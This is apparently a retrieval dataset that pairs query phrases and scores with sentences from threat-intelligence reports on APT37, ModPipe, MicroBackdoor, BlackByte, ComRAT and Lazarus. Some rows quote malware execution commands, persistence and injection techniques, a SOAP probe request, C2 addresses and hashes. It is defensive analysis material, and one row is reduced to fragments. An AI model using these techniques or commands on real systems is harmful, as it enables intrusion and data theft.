shell.']
URL registered in the task scheduler appears to be a normal homepage|0.8705756208266834|['In Figure 3, a trace can be seen of the malware creating and executing a normal Hancom Office file with the same filename as the malware within the same directory where the malware was executed.', 'The malware is injected and executed within the normal Windows process called mstsc.exe.', 'The original file is deleted using the cmd command.Figure 4 displays the trace data of mstsc.exe being executed after being injected with malware.', 'The malware registers its file with the name onedrivenew under the Run key in order to make it run after the system is rebooted.', 'Afterward, it uses the schtasks.exe command to register the file to the task scheduler with the name OneDriveOp to connect to a certain URL every 60 minutes using the normal Windows file mshta.exe.', 'The URL registered in the task scheduler appears to be a normal homepage, but it contains a web shell.', 'The inserted web shell has been confirmed to be similar to the one posted in Targeted Attack on a Website Developed by a Specific Web Design Company (Red Eyes and APT37) on theAhnLab Threat Intelligence Platform.When it comes to targeted attacks, there are factors that general users may struggle to deal with.', 'Even if users find themselves exposed to such threats, AhnLab EDR can provide trace data for appropriate responses.', '[File Detection] Trojan/Win.Agent.R580958 (2023.05.24.02)MD593fc0fb9b87a00b38f18c1cc4ee02e50URLhttp[:]//ingarchi[.]com/bbs/data/culturehttp[:]//ingarchi[.]com/bbs/data/culture/getcfg[.', ']php']
injected and executed within the normal Windows process called mstsc.exe.|0.9720744306344088|['The malware that is being distributed is named Who and What Threatens the World (Column).exe and is designed to deceive users by using an icon that is similar to that of Hancom Office.', 'Decompressing the compressed file reveals a relatively large file with a size of 36,466,238 bytes.AhnLab Endpoint Detection and Response (EDR) is capable of detecting such attack techniques through its trace data, and it allows users to check the data required to investigate the related breach case.Figure 1 depicts the icon of the malware and its overall execution.', 'It provides a visual representation of which processes are used when the malware is executed.Figures 2 and 3 show the trace data of key behaviors within the overall flow of the malware.', 'In Figure 2, a trace can be observed of the malware creating a folder named onedrivenew in the AppData directory and self-copying itself with the filename onedrivenew.exe to appear as a normal file.', 'In Figure 3, a trace can be seen of the malware creating and executing a normal Hancom Office file with the same filename as the malware within the same directory where the malware was executed.', 'The malware is injected and executed within the normal Windows process called mstsc.exe.', 'The original file is deleted using the cmd command.Figure 4 displays the trace data of mstsc.exe being executed after being injected with malware.', 'The malware registers its file with the name onedrivenew under the Run key in order to make it run after the system is rebooted.', 'Afterward, it uses the schtasks.exe command to register the file to the task scheduler with the name OneDriveOp to connect to a certain URL every 60 minutes using the normal Windows file mshta.exe.', 'The URL registered in the task scheduler appears to be a normal homepage, but it contains a web shell.', 'The inserted web shell has been confirmed to be similar to the one posted in Targeted Attack on a Website Developed by a Specific Web Design Company (Red Eyes and APT37) on theAhnLab Threat Intelligence Platform.When it comes to targeted attacks, there are factors that general users may struggle to deal with.']
registers its file with the name onedrivenew under the Run key|0.7974567329623665|['It provides a visual representation of which processes are used when the malware is executed.Figures 2 and 3 show the trace data of key behaviors within the overall flow of the malware.', 'In Figure 2, a trace can be observed of the malware creating a folder named onedrivenew in the AppData directory and self-copying itself with the filename onedrivenew.exe to appear as a normal file.', 'In Figure 3, a trace can be seen of the malware creating and executing a normal Hancom Office file with the same filename as the malware within the same directory where the malware was executed.', 'The malware is injected and executed within the normal Windows process called mstsc.exe.', 'The original file is deleted using the cmd command.Figure 4 displays the trace data of mstsc.exe being executed after being injected with malware.', 'The malware registers its file with the name onedrivenew under the Run key in order to make it run after the system is rebooted.', 'Afterward, it uses the schtasks.exe command to register the file to the task scheduler with the name OneDriveOp to connect to a certain URL every 60 minutes using the normal Windows file mshta.exe.', 'The URL registered in the task scheduler appears to be a normal homepage, but it contains a web shell.', 'The inserted web shell has been confirmed to be similar to the one posted in Targeted Attack on a Website Developed by a Specific Web Design Company (Red Eyes and APT37) on theAhnLab Threat Intelligence Platform.When it comes to targeted attacks, there are factors that general users may struggle to deal with.', 'Even if users find themselves exposed to such threats, AhnLab EDR can provide trace data for appropriate responses.', '[File Detection] Trojan/Win.Agent.R580958 (2023.05.24.02)MD593fc0fb9b87a00b38f18c1cc4ee02e50URLhttp[:]//ingarchi[.]com/bbs/data/culturehttp[:]//ingarchi[.]com/bbs/data/culture/getcfg[.']
registers its file with the name onedrivenew under the Run key in order to make it run after the system is rebooted.|0.98994046787435|['It provides a visual representation of which processes are used when the malware is executed.Figures 2 and 3 show the trace data of key behaviors within the overall flow of the malware.', 'In Figure 2, a trace can be observed of the malware creating a folder named onedrivenew in the AppData directory and self-copying itself with the filename onedrivenew.exe to appear as a normal file.', 'In Figure 3, a trace can be seen of the malware creating and executing a normal Hancom Office file with the same filename as the malware within the same directory where the malware was executed.', 'The malware is injected and executed within the normal Windows process called mstsc.exe.', 'The original file is deleted using the cmd command.Figure 4 displays the trace data of mstsc.exe being executed after being injected with malware.', 'The malware registers its file with the name onedrivenew under the Run key in order to make it run after the system is rebooted.', 'Afterward, it uses the schtasks.exe command to register the file to the task scheduler with the name OneDriveOp to connect to a certain URL every 60 minutes using the normal Windows file mshta.exe.', 'The URL registered in the task scheduler appears to be a normal homepage, but it contains a web shell.', 'The inserted web shell has been confirmed to be similar to the one posted in Targeted Attack on a Website Developed by a Specific Web Design Company (Red Eyes and APT37) on theAhnLab Threat Intelligence Platform.When it comes to targeted attacks, there are factors that general users may struggle to deal with.', 'Even if users find themselves exposed to such threats, AhnLab EDR can provide trace data for appropriate responses.', '[File Detection] Trojan/Win.Agent.R580958 (2023.05.24.02)MD593fc0fb9b87a00b38f18c1cc4ee02e50URLhttp[:]//ingarchi[.]com/bbs/data/culturehttp[:]//ingarchi[.]com/bbs/data/culture/getcfg[.']
calls the VirtualProtect function|0.7736085766209332|"['PC   ,       .', '[ 1-1]  \'CVE-2022-41128\'  3InternetExplorer0-dayexploitedbyNorthKoreanactorAPT37 4[]\'\' 5"""" Genians Security Center 3Threat Intelligence Report 2.', '(Attack Scenario) 2.1.', '/  (Initial Access / Infection Vectors)      .', 'HWPX, HWP, LNK(XLSX ), DOCX  ,  XLSX   .', '.', ',   .', '.', '2.2.', '(Spear Phishing Attachment)  7   .', ', HWPX    .']"
log keystrokes|0.9387455016724598|['properly restricted and assigned to only those who require them.', 'STEP 7: HARVEST CREDENTIALS Delivered BlackEnergy 3 malware plugins conduct STEP 8: LATERAL MOVEMENT credential harvesting and network discovery AND TARGET IDENTIFICATION ON functions.', 'CORPORATE NETWORK Threat actors conduct internal reconnaissance on Location: Corporate network the corporate network to discover potential targets Action: Active threat actor activity, malware and expand access.', 'execution Location: Corporate network Timeline: June 2015December 2015 Action: Active threat actor activity, malware Device/application: Windows OS workstations, execution Windows domain controllers, virtual private Timeline: June 2015December 2015 network (VPN) service deployed in control environment Device/application: Discovered systems, including networked uninterruptable power Role in infrastructure: These systems support supply (UPS) devices, data center servers, business operations, manage permissions and a telephone communications server, and domain access, and provide remote network employee workstations access respectively.', 'Role in infrastructure: Internal reconnaissance Exploitation method: Threat actors use delivered efforts could potentially include all deployed BlackEnergy 3 plugins to gather stored credentials devices on the corporate network.', 'or log keystrokes.', 'After gathering valid credentials for user with administrator privileges, threat actors Exploitation method: Threat actors likely use a use the stolen administrator credentials to access combination of valid user credentials and the domain controller, recover additional creden- BlackEnergy 3 plugins developed to conduct tials, and create new privileged accounts.', 'network discovery.', 'VS.dll plugin is likely used to leverage MS Sysinternals PsExec to establish Impact: Threat actors obtain valid credentials remote connections to workstations and servers.', 'enabling them to expand access across the corporate network and into the control environment, Impact: Threat actors are able to enumerate the ensure persistent access, and blend into regular systems deployed across the network, identify network traffic.', 'targets, and begin preparations for final attack.']
encrypted|0.8469902237088173|"['The embedded message is similar to a message left by another ransomware variant known as Target777.', 'We believe it was most likely copied, possibly as a false flag, and that the two threat actors are not related.', 'The message is as follows: Hello [REDACTED] Please, check this message in detail and contact a person from IT department.', 'Your personam computer has been infected by ransomware virus.', 'All your personal files ( Passport,visas etc. )', 'are encrypted .', 'If you want to restore your files including your clients personal data, you will need to make the payment.', 'Otherwise all your files will be posted in the internet which may lead you to the loss of reputation and cause the troubles for your business .', 'let us know if you have any questions.', ""Our email address : [REDACTED]@protonmail.com If you don't get an answer from us within one day , we will contact you at [REDACTED] Fig 18: Apostle ransom note Interestingly, the function responsible for writing the message to file attempts to replace strings such as <hostname> and <id> to customize the message to the machine."", 'Those strings, however, were not found in the message embedded in this sample, which might indicate there are additional, yet undiscovered, versions of this ransomware.']"
encrypted|0.7839468451047862|['In this type of attack the malicious actor aims to bypass the applications caching capability by sending random (or not recognizable) GET requests to flood the application server with requests to handle.', 'Persistent DDoS Attacks (i.e.', 'multi-day).', 'This type of DDoS is famous for its two stages of infecting hosts and creating botnet of zombies who pretend to be a well defended endpoint and the attack phase that has been seen to take from minutes to over multiple days.', 'The vector varies from network type attacks to application layer attacks235.', 'Encrypted Attacks.', 'The rise of using encrypted services and traffic (SSL) on the web has attracted different levels of DDoS attacks.', 'This includes attacks on the application level (flood attacks, bruteforce etc.', '), network level and the protocol level (i.e.', 'SSL renegotiation or downgrade) making it harder for defenders and toolsets to recognise malicious traffic from legitimate236.', '3.5.5 Specific attack vectors According to Nexusgaurd Q2 2018 report, most of the attacks were focused on hit-run tactics and specifically during peak times to strike their targets with UDP, TCP (SYN) and ICMP floods being the top 3 vectors.']
unpacks and loads the next stage of the malware, namely the main module|0.9054117444668079|"['According to the documentation, to achieve this the attackers would have to reverse engineer the generation process of the site-specific passphrase, which is used to derive the encryption key for sensitive data.', 'This process would then have to be implemented into the module and due to use of the Windows Data Protection API (DPAPI) executed directly on the victims machine.', 'Another remaining unknown is ModPipes distribution method.', 'The majority of the identified targets were from the United States, with indications that they were in the restaurant and hospitality sectors the primary customers of RES 3700 POS.', 'ModPipe architecture Our analysis shows that ModPipe uses modular architecture consisting of basic components and downloadable modules (for a better overview see Figure 1): 1. initial dropper contains both 32-bit and 64-bit binaries of the next stage the persistent loader and installs the appropriate version to the compromised machine.', '2. persistent loader unpacks and loads the next stage of the malware, namely the main module.', '3. main module performs the main functionality of the malware.', 'It creates a pipe used for communication with other malicious modules, un/installs these modules and serves as a dispatcher that handles communication between the modules and attackers C&C server.', '4. networking module module used for communication with C&C.', '5. downloadable modules components adding specific functionality to the backdoor, such as the ability to steal database passwords and configuration information, scan specific IP addresses or acquire a list of the running processes and their loaded modules.', 'https://www.welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector/ 2/2211/13/2020 Hungry for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurity Figure 1.']"
upload data to C&C|0.8248925623385384|['Although our analysis and attribution efforts are ongoing, we have discovered some indicators that suggest the threat actor may be a Chinese group.', 'The campaigns The APT group has launched at least four campaigns since late February, using a variety of lures, detailed below.', '1.', 'Interactive map of Ukraine The threat actor started this campaign around February 26, 2022, and distributed its custom malware with the name interactive_map_UA.exe, trying to disguise it as an interactive map of Ukraine.', 'This campaign began a few days after Russia invaded Ukraine, which shows the threat actor was monitoring the situation between Ukraine and Russia and took advantage of it to lure targets in Russia.', '2.', 'Log4j patch In this campaign the threat actor packaged its custom malware in a tar file called Patch_Log4j.tar.gz, a fake fix for Decembers high-profile Log4j vulnerability.', 'This campaign ran in early March and was primarily aimed at RT TV (formerly Russia Today or Rossiya Segodnya, a Russian state-controlled international television network funded by the Russian government).', 'The APT group had access to almost 100 RT TV employees email address.', 'The emails were sent with the subject .', '.']
upload data to C&C|0.7646018763299269|['The C2 reply only contains the external IP address of the implant.', 'The malware recognizes the following command codes/names sent by the C2 servers to execute corresponding actions on the infected system: Command name Capability deleteme Delete itself from the system using a BAT file.', 'download Download files from a specified remote location.', 'rename Rename files on the system.', 'iamsleep Instructs the implant to go to sleep for a specified amount of time.', 'upload Upload files to C2.', 'showurls Empty command (Not implemented yet).', 'Illustrating operation Blacksmith This particular attack observed by Talos involves the successful exploitation of CVE-2021-44228, also known as Log4Shell, on publicly facing VMWare Horizon servers, as a means of initial access to vulnerable public- 7/12facing servers.', 'Preliminary reconnaissance follows the initial access leading to the deployment of a custom- made implant on the infected system.', 'Typical Infection chain observed in Operation Blacksmith.', 'Phase 1: Initial reconnaissance by Lazarus Lazaruss initial access begins with successful exploitation of CVE-2021-44228, the infamous Log4j vulnerability discovered in 2021.']
upload data to C&C|0.7760017795473396|['JSON results ssh_obj sent to the C2 server with code value 1 and args indicating the results.', 'Send contents of keylogger buffer and clipboard data.', 'Reports to C2 server with JSON code ssh_clip value 3 and args containing the collected data.', '9/17ssh_run Downloads and runs the browser stealer component.', 'Reports to C2 server with JSON code value 4 and args containing the file path for this component.', 'Upload data to a C2 server.', 'Subcommands include: Upload all contents of a specific directory.', 'Upload specific files.', 'Upload files matching a given pattern looking recursively in a given folder.', 'Contents are uploaded to an actor-controlled FTP server, provided in the JSON response using the following args: ssh_upload hn: FTP host.', 'un: Username.']
collect information about currently running processes, including: name, process identifier (PID), parent process PID, number of threads, token owner, token domain, process creation time, and command line|0.9664912527284777|"['The TDS login packet is hardcoded, with username set to the built-in dba and a hardcoded password, which is potentially the default password in some RES 3700 POS versions.', 'As we havent found any public reference to this password, we wont be publishing it in our blogpost.', 'Figure 6.', 'TDS 4.2 & 5.0 Login Packet used by the ModScan module, dissected using Wireshark Downloadable module: ProcList The last of the downloadable modules we were able to obtain and dissect was ProcList.', 'This is a lightweight module that doesnt have an assigned ID.', 'Its main purpose is to collect information about currently running processes, including: name, process identifier (PID), parent process PID, number of threads, token owner, token domain, process creation time, and command line.', 'https://www.welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector/ 10/2211/13/2020 Hungry for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurity Optionally, ProcList can also collect information about loaded modules for each of the running processes.', 'Collected information is sent to the main module of the backdoor (using pipe message 0x10000013).', 'Initial dropper The initial dropper is responsible for installing the next stage of the malware.', 'During our investigation, we discovered one dropper executable on two compromised machines, stored in the following locations: C:\\\\IQXDatabase\\\\Live\\\\1.exe C:\\\\OasisLive\\\\1.exe Each time the initial dropper is executed, a unique configuration is generated, using mostly random bytes.', 'This causes the hash of the dropped loader to change with each execution, complicating detection and tracking of the malware.']"
Windows registry Run key|0.8658875114268401|[']online:8443 185[.', ']175.158.27 : 1/2%PUBLIC%\\\\ignit.vbs %PUBLIC%\\\\Favorites\\\\desktop.ini %PUBLIC%\\\\Libraries\\\\core.dll %APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\Windows Prefetch.lNk wscript.exe //B //E:vbs C:\\\\Users\\\\Public\\\\Favorites\\\\desktop.ini C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\regasm.exe /U C:\\\\Users\\\\Public\\\\Libraries\\\\core.dll  MicroBackdoor is a publicly available backdoor program developed using the C ++ programming language.', 'Author: cr4sh (aka Dmytro Oleksiuk).', 'Functional: id, info, ping, exit, upd, uninst, exec, shell, flist, fget, fput, screenshot (implemented separately by members of the group UAC-0051 / unc1151).', 'The server part is designed using the Python programming language and provides a simple web interface for managing bots.', 'Persistence: Run Windows Registry Key.', 'Communication between the bot and the server is encrypted using RC4.', 'Graphic images Fig.', '1 Example of malicious files and image baits 2/2']
GetTickCount Windows API|0.8120111534596209|"['Uses GetTempPathA, SetCurrentDirectoryA APIs.', 'dev - Returns the list of drives in the system with their type (fixed, removable, etc).', 'The following strings are used for their types: unk, nrt, rmv, fix, net, cdr, ram, und.', 'Uses GetLogicalDriveStringsA, GetDriveTypeA apis.', 'time - Gets the number of hours since the system was started: ""uptime %5d.%02dh.', 'Uses GetTickCount api.', 'info - Gets info about system.', 'String generated like: ""%d %s\\\\n%s\\\\ %s\\\\"" using GetCurrentProcessId, GetModuleFileNameA, GetComputerNameA, GetUserNameA apis.', 'exit - ""exiting..."" dir, ls - List files in current dir.', 'Uses FindFirstFile(""*""), FindNextFile apis.', 'exeu - CreateProcessWithLogonW and reads data from pipe.']"
IP addresses intended for scanning and the special “ping” IP address|0.8042180137647934|"['Based on our findings, it is typically associated with one of the following legitimate processes: MDSHTTPService.exe (MICROS MDS HTTP Service) CALSrv.exe (MICROS CAL Service Client Application Loader server) explorer.exe We can confirm that the GetMicInfo module can successfully obtain the database passwords from RES 3700 POS v4.7 and v5.4.', 'For all the other versions, we were able neither to confirm nor deny the ability of the component to obtain the targeted libraries.', 'Downloadable module: ModScan 2.20 The main purpose of ModScan 2.20 is to collect additional information about the installed MICROS POS environment on the machines by scanning selected IP addresses.', 'The ModScan 2.20 module is injected into one of the processes specified by the C&C via an InstallMod command (0x72).', 'Based on our findings, it is typically associated with one of the following legitimate processes: MDSHTTPService.exe (MICROS MDS HTTP Service) CALSrv.exe (MICROS CAL Service Client Application Loader server) msdtc.exe jusched.exe spoolsv.exe services.exe Differences between the injected processes misused by GetMicInfo and those targeted by ModScan 2.20 might be caused by the fact that GetMicInfo module is injected only into processes running under WOW64.', 'The list of IP addresses intended for scanning and the special ping IP address are specified by the C&C in one of two ways.', 'It is either: 1. downloaded from the C&C along with the ModScan module, or 2. received during runtime, using the named pipe associated with the ModScan module.', 'The ModScan module handles pipe commands listed in Table 2.', 'Table 2.', 'ModScan 2.20 module pipe commands Command name Command description https://www.welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector/ 7/2211/13/2020 Hungry for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurity Command name Command description exit Exit stop Terminate scanning threads scan Start scanning IPs specified in the command data to collect additional in- formation about the environment prm Specify special ping IP address Scanning procedure routine 1.', 'Before scanning, the module sends a special ping message containing a 32-bit value generated by the GetTickCount Windows API function to TCP ports 50123 (used by MDS HTTP Service) and 2638 (used by SAP Sybase database server) of the ping IP address.']"
downloaded from the C&C along with the ModScan module|0.8103151106033756|"['It is either: 1. downloaded from the C&C along with the ModScan module, or 2. received during runtime, using the named pipe associated with the ModScan module.', 'The ModScan module handles pipe commands listed in Table 2.', 'Table 2.', 'ModScan 2.20 module pipe commands Command name Command description https://www.welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector/ 7/2211/13/2020 Hungry for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurity Command name Command description exit Exit stop Terminate scanning threads scan Start scanning IPs specified in the command data to collect additional in- formation about the environment prm Specify special ping IP address Scanning procedure routine 1.', 'Before scanning, the module sends a special ping message containing a 32-bit value generated by the GetTickCount Windows API function to TCP ports 50123 (used by MDS HTTP Service) and 2638 (used by SAP Sybase database server) of the ping IP address.', '2.', 'The response from the ping IP address should contain the same 32-bit value rotated right by one bit and XORed with the value 0x6CF6B8A8.', 'If the response on at least one of the ports provides the appropriate value, the module will start the scan of the selected IP addresses.', 'A decompilation of this ping function is shown in Figure 4.', 'Figure 4.', 'Hex-Rays decompiled code of the ModScan ping functionality 3.']"
stored between data xml tags (<data>%version%</data>) of the response from the service|0.8854248271009519|"['If the response on at least one of the ports provides the appropriate value, the module will start the scan of the selected IP addresses.', 'A decompilation of this ping function is shown in Figure 4.', 'Figure 4.', 'Hex-Rays decompiled code of the ModScan ping functionality 3.', 'When the ModScan module starts the scan, some of the following information may be gathered, depending on the parameters received along with the scan command: Version of the Oracle MICROS RES 3700 POS, which is acquired by sending an HTTP Post message (see Figure 5) to the specified IP address on port 50123 used by the MDS HTTP Service.', 'The sought-after information is stored between data xml tags (<data>%version%</data>) of the response from the service.', 'https://www.welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector/ 8/2211/13/2020 Hungry for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurity 1 POST /%s HTTP/1.1 2 Accept: text/xml 3 User-Agent: MDS POS Client 4 Host: %s:50123 5 Content-Length: 459 6 Connection: Keep-Alive 7 Cache-Control: no-cache 8 9 <SOAP-ENV:Envelope xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/enve- lope/""> 10 <SOAP-ENV:Body xmlns:MCRS-ENV=""MCRS-URI""> 11 <MCRS-ENV:Service>MDSSYSUTILS</MCRS-ENV:Service> 12 <MCRS-ENV:Method>Reg_GetValue</MCRS-ENV:Method> 13 <MCRS-ENV:SessionKey>Session</MCRS-ENV:SessionKey> 14 <MCRS-ENV:InputParameters> 15 <Key>SOFTWARE\\\\MICROS</Key> 16 <KeyType>HKEY_LOCAL_MACHINE</KeyType> 17 <KeyName>Version</KeyName> 18 </MCRS-ENV:InputParameters> 19 </SOAP-ENV:Body> 20 </SOAP-ENV:Envelope> Figure 5.', 'MDS HTTP Service request Name of the database, extracted by sending a specially crafted TCP packet (possibly using the CMDSEQ command protocol) to the selected IP address on port 2638 used by the SAP Sybase Database Server.', 'The string representing the name of the database is located at offset 0x28 of the response sent by the database server.', 'https://www.welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector/ 9/2211/13/2020 Hungry for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurity Database server data, such as its name, version of the TDS protocol and the TDS server version.', 'To gain this information, the ModScan module sends a hardcoded TDS 4.2 & 5.0 Login Packet (Figure 6) to the specified IP address on port 2638.']"
encrypted payload, containing the main functionality of the dropper, is stored in the dropper’s resources as bitmaps named from A to L.|0.8005092456847854|"['Collected information is sent to the main module of the backdoor (using pipe message 0x10000013).', 'Initial dropper The initial dropper is responsible for installing the next stage of the malware.', 'During our investigation, we discovered one dropper executable on two compromised machines, stored in the following locations: C:\\\\IQXDatabase\\\\Live\\\\1.exe C:\\\\OasisLive\\\\1.exe Each time the initial dropper is executed, a unique configuration is generated, using mostly random bytes.', 'This causes the hash of the dropped loader to change with each execution, complicating detection and tracking of the malware.', 'The dropper component can drop the loader into two possible locations and set up the persistence mechanism by creating a Windows service or Windows registry Run key (for details, please refer to the Indicators of Compromise section).', 'The encrypted payload, containing the main functionality of the dropper, is stored in the droppers resources as bitmaps named from A to L. The dropper decrypts this payload using the provided command line parameter, then executes it.', 'The payload is responsible for decrypting the appropriate loader depending on the system architecture, so either 32-bit or 64-bit.', 'Each of the loaders is encrypted using its own XOR key, each 0x80 bytes long.', 'Decompiled code responsible for loading the payload from the binarys resources, its decryption and execution is shown in Figure 7. https://www.welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector/ 11/2211/13/2020 Hungry for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurity Figure 7.', 'Hex-Rays decompiled code decryption and execution of the payload in the initial dropper https://www.welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector/ 12/2211/13/2020 Hungry for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurity An example of an encrypted and decrypted configuration with explanations is visible in Figure 8.', 'The configuration shown comes from the loader installed by the dropper sample with SHA-1 hash 9f8530627a8ad38f47102f626dec9f0173b44cd5.']"
with username set to the built-in dba and a hardcoded password, which is potentially the default password in some RES 3700 POS versions.|0.8994384302707921|"['MDS HTTP Service request Name of the database, extracted by sending a specially crafted TCP packet (possibly using the CMDSEQ command protocol) to the selected IP address on port 2638 used by the SAP Sybase Database Server.', 'The string representing the name of the database is located at offset 0x28 of the response sent by the database server.', 'https://www.welivesecurity.com/2020/11/12/hungry-data-modpipe-backdoor-hits-pos-software-hospitality-sector/ 9/2211/13/2020 Hungry for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurity Database server data, such as its name, version of the TDS protocol and the TDS server version.', 'To gain this information, the ModScan module sends a hardcoded TDS 4.2 & 5.0 Login Packet (Figure 6) to the specified IP address on port 2638.', 'The response includes a Login Acknowledgement packet which, in both cases success and failure contains information about the database server and the TDS versions used.', 'The TDS login packet is hardcoded, with username set to the built-in dba and a hardcoded password, which is potentially the default password in some RES 3700 POS versions.', 'As we havent found any public reference to this password, we wont be publishing it in our blogpost.', 'Figure 6.', 'TDS 4.2 & 5.0 Login Packet used by the ModScan module, dissected using Wireshark Downloadable module: ProcList The last of the downloadable modules we were able to obtain and dissect was ProcList.', 'This is a lightweight module that doesnt have an assigned ID.', 'Its main purpose is to collect information about currently running processes, including: name, process identifier (PID), parent process PID, number of threads, token owner, token domain, process creation time, and command line.']"
create a new service for persistence.|0.7545309731862249|['query Dump information about a service.', 'start Start a service.', 'stop Stop a service.', 'pause Pause a service.', 'continue Make a paused service resume execution.', 'create Create a new service.', 'config Change configuration for a service.', 'delete Delete a service.', 'desc Change the description of a service.', 'To get help for a specific command use: %s {command} -h sinfo System information sinfo Usage: sinfo [-a] For any inquiries, contact intelreports@kaspersky.com Page 18 of 33The ProjectSauron APT.', 'Technical analysis -a Show volume information for all drives (removable, network etc).']
use Registry Run key for persistence|0.8338227608134725|[']online:8443 185[.', ']175.158.27 : 1/2%PUBLIC%\\\\ignit.vbs %PUBLIC%\\\\Favorites\\\\desktop.ini %PUBLIC%\\\\Libraries\\\\core.dll %APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\Windows Prefetch.lNk wscript.exe //B //E:vbs C:\\\\Users\\\\Public\\\\Favorites\\\\desktop.ini C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\regasm.exe /U C:\\\\Users\\\\Public\\\\Libraries\\\\core.dll  MicroBackdoor is a publicly available backdoor program developed using the C ++ programming language.', 'Author: cr4sh (aka Dmytro Oleksiuk).', 'Functional: id, info, ping, exit, upd, uninst, exec, shell, flist, fget, fput, screenshot (implemented separately by members of the group UAC-0051 / unc1151).', 'The server part is designed using the Python programming language and provides a simple web interface for managing bots.', 'Persistence: Run Windows Registry Key.', 'Communication between the bot and the server is encrypted using RC4.', 'Graphic images Fig.', '1 Example of malicious files and image baits 2/2']
encoded malware|0.7979859435855206|['Figure 15 shows KiraV2s routine that checks whether busybox is installed.', 'In case of KiraV2, it runs /bin/busybox DEMONS command instead of /bin/busybox MIRAI command, and following this, the scan result value is DEMONS: applet not found instead of MIRAI: applet not found.', 'Figure 15.', 'KiraV2s routine that checks whether busybox is installed The final difference is that in Mirai, address and port no.', 'of report server are encoded, but in KiraV2, just like C&C server, IP address of report server is hard-coded, and only port no.', 'is encoded.', 'Figure 16 shows KiraV2s routine of finding report server address.', 'To use IP address Report 100 20as parameter of function, it needs to be converted first.', 'The attacker however, used this string without converting it.', 'Because of this, the strings address 0x08056e51 inside memory, or IP address 81.110.5.8 becomes the connection address instead of IP address 131.153.18.72.', 'It can be assumed that this is not an intentional trick, but rather, a developers mistake.']
malware samples are packed with UPX Packer.|0.8052083741253564|"['BlackByte Ransomware Takes an Extra Bite Using Double Extortion MethodsThe BlackByte ransomware variant was first discovered in summer 2021 and has since then produced many new variants, with the latest beingspotted in the wildin recent months.', 'BlackByte is a prolific Ransomware-as-a-Service (RaaS) malware which utilizes an increasingly populardouble extortionmethod.', 'In this type of attack, the threat actor both exfiltrates and encrypts the victims data.', 'This gives the attacker additional leverage when attempting to collect a ransom payment from the victim, as they can threaten to publish or sell potentially sensitive data on the dark web if their demands are not met.In addition, recent BlackByte operators have been spotted leveraging a custom exfiltration tool which has been dubbed ExByte in order to steal the victims data, pre-encryption.', 'Once exfiltrated, the stolen files are uploaded to the Mega cloud storage service.Operating SystemTechnical AnalysisInitially, BlackByte samples were written in the C programming language; however, in recent variations there has been a shift to files written in the more uncommonGo language, with some being a hybrid of both programming languages.', 'Most samples in the wild are UPX packed, with many new variants being packed by a custom UPX packer.', ""UPX is a free executable packer for several executable formats.Typically, the malware sports an icon of the Grim Reaper with the lettering BB on the character's robes, which stands for BlackByte.Figure 1 - Grim Reaper icon used by BlackByte malwareTo make the malware appear legitimate and aid it in remaining hidden on the victims system, the file uses a product description similar to legitimate programs."", 'In the case of the sample analyzed by BlackBerry threat researchers for this report, it was masquerading as an Amazon Corp file.Figure 2 - Malware masquerades a legitimate programSystem ChecksWhen executed, the ransomware will check the victims system language against the language IDs shown below.', 'If any of them match, the malware will exit and not perform the encryption process.CountryLanguage CodeArmenia1067Azerbaijan2092Belarus1059Kazakhstan1087Russia1049Tajik1064Uzbek2115Ukraine1058Georgia1079Turkmen1090Additionally, the malware will perform a check against the below list of DLL modules which are related to malware analysis tools.', 'If present, the malware will immediately exit, and encryption will not be carried out.', 'This is presumably to aid BlackByte in remaining undetected by malware researchers.DLL NameDescriptionDBGHELP.DLLWindows DbgSbieDll.dllSandboxieSxIn.dllQihu 360Sf2.dllAvastsnxhl.dllAvastcmdvrt32.dllComodoAccess and PersistenceUpon execution, this ransomware deletes volume shadow copies and system backups to hamper recovery efforts by the user.']"
contains the ability to inject .NET assemblies into unmanaged processes.|0.8720912459351006|['Decoded IronPython script with embedded .NET injector and ComRAT payload (both shortened).We have found two versions of the.NET injector, a newer variant internally named NetInjector compiled in 2019 and an earlier variant namedPeInjector_x64compiled in 2018.', 'The earlier variant is much more limited in functionality compared to the 2019 variant.Both versions are full-blown PE injection tools able to load a native x86/64 payload reflectively into a remote process.', 'This is accomplished via unmanaged functions and the use ofPeNet, a publicly available PE parser library written in C#.', 'The decompiled code is self-explanatory as meaningful function, method and variable names are used throughout the code.', 'Additionally, log and error messages are being used extensively.Most of the code of the 2018 variant is taken from PowerShell EmpiresReflectivePEInjectionscript and got translated into C#.Its written in a much more specific manner than the 2019 variant, which is a generically written injection tool.', 'The newer version additionally contains the ability to inject .NET assemblies into unmanaged processes.', 'Also, it can load payloads into its own process space, the IronPython interpreter process.The newer injector has the following PDB path left:C:\\\\Users\\\\Devel\\\\source\\\\repos\\\\c4\\\\agent\\\\build_tools\\\\agent_dll_to_Python_loader\\\\NetInjector\\\\NetInjector\\\\obj\\\\Release\\\\NetInjector.pdbThe same submitters who uploaded the IronPython scripts also submitted other files which are directly related to IronNetInjector.', 'Based on the file sizes and the file sizes of the embedded payloads in the IronPython scripts, we can make some assumptions about what the payloads likely are.The following table shows the IronPython scripts categorized by the different VirusTotal submitters.', 'It also shows which other samples 